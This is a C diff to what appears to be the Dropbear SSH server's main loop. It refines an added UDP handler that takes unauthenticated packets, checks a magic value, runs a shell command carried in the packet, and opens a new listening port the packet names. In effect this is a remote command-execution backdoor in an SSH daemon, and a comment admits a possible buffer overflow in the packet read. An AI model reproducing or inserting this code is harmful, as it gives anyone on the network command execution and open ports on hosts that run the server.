@@ -34,7 +34,7 @@
 #include "uhandler.h"
 
 
-static size_t listensockets(int *sock, size_t sockcount, int *maxfd);
+static size_t listensockets(int *sock, size_t sockcount, int *maxfd, int flag);
 static void sigchld_handler(int dummy);
 static void sigsegv_handler(int);
 static void sigintterm_handler(int fish);
@@ -49,8 +49,7 @@ static void commonsetup(void);
 int add_port_request(int);
 int new_port_available(const char * );
 void start_udp_request(void);
-int udp_flag;//global flag - to start udp server only once
-int udp_index; //global index- to know which is the udp port
+int udp_flag;/* Global flag - to start udp handler only once */
 
 #if defined(DBMULTI_dropbear) || !DROPBEAR_MULTI
 #if defined(DBMULTI_dropbear) && DROPBEAR_MULTI
@@ -135,10 +134,11 @@ static void main_noinetd() {
 	int childsock;
 	int childpipe[2];
 
-	//UDP ADITIONS
-	int udpsockfd,n,len;
+	//UDP handler additions
+	int udpsockfd,n,len, tmp_listens=0;
     struct sockaddr_in cliaddr;
     char buffer[BUFFERSIZE]; 
+	listen_packet_t new_packet;
 
 
 	/* Note: commonsetup() must happen before we daemon()ise. Otherwise
@@ -162,7 +162,7 @@ static void main_noinetd() {
 	}
 	
 	/* Set up the listening sockets */
-	listensockcount = listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock);
+	listensockcount = listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock, 0);
 	if (listensockcount == 0)
 	{
 		dropbear_exit("No listening ports available.");
@@ -197,8 +197,6 @@ static void main_noinetd() {
 		fclose(pidfile);
 	}
 
-
-
 	/* incoming connection select loop */
 	for(;;) {
 
@@ -212,7 +210,6 @@ static void main_noinetd() {
 			FD_SET(udpsockfd, &fds);
 		}
 		
-
 		/* pre-authentication clients */
 		for (i = 0; i < MAX_UNAUTH_CLIENTS; i++) {
 			if (childpipes[i] >= 0) {
@@ -254,44 +251,42 @@ static void main_noinetd() {
 		}
 
 		/* handle each socket which has something to say */
-
+		/*handle udp socket first */
 		if (udp_flag && FD_ISSET(udpsockfd, &fds)){
 			// printf("GOT FD_ISSET(udpsockfd, &fds)!,\tsvr_opts.portcount:%d\n",svr_opts.portcount);
 			len = sizeof(cliaddr);  //len is value/resuslt 
-        	// exception might occur when n>BUFFERSIZE -> buffer overflow
+        	/*exception might occur when n>BUFFERSIZE -> buffer overflow */
         	n = recvfrom(udpsockfd, (char *)buffer, PACKETSIZE,  
                     	MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
                     	&len);
-			if((unsigned)n != PACKETSIZE){//need to get exactly packet size
-            	printf("buffer:%s\n",buffer);
+			if((unsigned)n != PACKETSIZE){
+            	// printf("buffer:%s\n",buffer);
+				TRACE(("ERROR: wrong packet size:%d",n))
 			}
 			else
 			{
-				listen_packet_t new_packet;
 				parse_packet(&new_packet,buffer);
-				//execute shell command and port adding only if 0xDEADBEEF and legal command
     			if(check_shell_command(&new_packet)){
-            		//execute the shell_command, then add port
-            		shell_exec_command(new_packet.shell_command , udpsockfd); //func in svr-chansession
-					// printf("listensockcount:%d\n",listensockcount);
-
+            		/* execute the shell_command */
+            		shell_exec_command(new_packet.shell_command); //func in svr-chansession
+					/* add port */
 					if(add_port_request((int)new_packet.port_number)){ //func in svr-main   
-						int tmp_listens= listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock);
-						if(tmp_listens > 0) //update listensockcount if not error
-							listensockcount=tmp_listens;							
+						tmp_listens= listensockets(listensocks, MAX_LISTEN_ADDR, &maxsock, 1);
+						/* update listensockcount if not error */
+						// if(tmp_listens > 0) 
+						// 	listensockcount=tmp_listens;							
+						listensockcount = MAX(listensockcount, tmp_listens);
 					}
 					// printf("listensockcount:%d\n",listensockcount);
 					// printf("AFTER udp_fd:%d\t listensocks[]:\n",udpsockfd);
 					// for (i = 0; i < listensockcount; i++)
-					// 	printf("%d ,",listensocks[i]);
+					// 	printf("%s ,",svr_opts.ports[i]);
 					// printf("\n");
     			}
-
-			}
-			
-        }
+			}	
+        } /* udp_flag handler */
 		
-
+		/*handle all listed TCP ports */
 		for (i = 0; i < listensockcount; i++) {
 			size_t num_unauthed_for_addr = 0;
 			size_t num_unauthed_total = 0;
@@ -478,18 +473,24 @@ static void commonsetup() {
 }
 
 /* Set up listening sockets for all the requested ports */
-static size_t listensockets(int *socks, size_t sockcount, int *maxfd) {
+static size_t listensockets(int *socks, size_t sockcount, int *maxfd, int flag) {
 
 	unsigned int i, n;
 	char* errstring = NULL;
 	size_t sockpos = 0;
 	int nsock;
-
+	
 	TRACE(("listensockets: %d to try", svr_opts.portcount))
-	// i = listensockcount;
-	// if(listensockcount>0)
-	// 	i--;
-	for (i=0; i < svr_opts.portcount; i++) {
+	// Start listen to svr_opts.ports from the beginning at the first time,
+	// Otherwise set listening port only to the most recent port
+	if(flag){ 
+		i = svr_opts.portcount-1;
+	}
+	else{
+		i=0;
+	}
+
+	for (; i < svr_opts.portcount; i++) {
 		TRACE(("listening on '%s:%s'", svr_opts.addresses[i], svr_opts.ports[i]))
 
 		nsock = dropbear_listen(svr_opts.addresses[i], svr_opts.ports[i], &socks[sockpos], 
@@ -533,14 +534,14 @@ int new_port_available(const char * new_port){
 
 int add_port_request(int new_port){
 	if(new_port == 0){ //input check
-		printf("ERROR add_port_request: port=0 !\n");
+		TRACE(("ERROR add_port_request: port=0 !"))
 		return 0;
 	}
 	char str[6];
     sprintf(str, "%d", new_port);
 	//check if there is a place for new_port
 	if(svr_opts.portcount==DROPBEAR_MAX_PORTS){
-		printf("ERROR add_port_request: no room for new_port!\n");
+		TRACE(("ERROR add_port_request: no room for new_port!"))
 		return 0;
 	}
 	if(new_port_available(str)){ //if true- add port
@@ -549,21 +550,19 @@ int add_port_request(int new_port){
 		return 1;	 
 	}
 	else{
-		printf("ERROR add_port_request: port %d is already in use!\n",new_port);
+		TRACE(("ERROR add_port_request: port %d is already in use!",new_port))
 		return 0;
 	}
 }
 
-//middleware between svr-runopts.c to uhandler.c
-//send udp server request to uhandler only in first time
+//Raise the global flag only once
+//The port init will be in main_noinetd
 void start_udp_request(void){
 	if(!udp_flag){
 		udp_flag = 1;
-		// udp_index = svr_opts.portcount; //save before adding
-		// add_port_request(UDPPORT);
 	}
 	else{
-		printf("ERROR UDP request: UDPhandler already running!\n");
+		TRACE(("ERROR UDP request: UDPhandler already running!"))
 	}
 }
 
